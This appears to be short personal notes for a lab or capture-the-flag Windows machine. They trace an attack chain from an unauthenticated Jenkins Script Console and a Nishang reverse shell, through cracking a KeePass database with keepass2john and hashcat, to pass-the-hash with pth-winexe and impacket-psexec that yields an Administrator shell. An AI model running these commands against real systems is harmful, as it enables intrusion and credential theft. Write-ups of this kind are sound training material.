Jenkins Webapp

Login without creds
Cmd execution via "Script Console"
Execute Nishang "Invoke-PowershellTCP.ps1" to get a reverse shell

# PrivEsc

Upload PowerUp: Invoke-AllChecks
=> SeImpersonagePrivileges

Also: KeePass DB in users Documents directory

```bash
# Convert keepass db to crackable hash
keepass2john db.kdbx > db.hash

# Crack
hashcat -m 13400 db.hash <wordlist>
```

Open DB in KeePass2 app
=> found NTLM hash

```bash
# old
pth-winexe -U DOMAIN/user%HASH //target-ip "cmd.exe"

# new
impacket-psexec -hashes :<NTLM_HASH> domain/username@target-ip
```

=> Administrator shell

## Alternative Privesc

SeImpersonagePrivileges => Rotten Potato exploit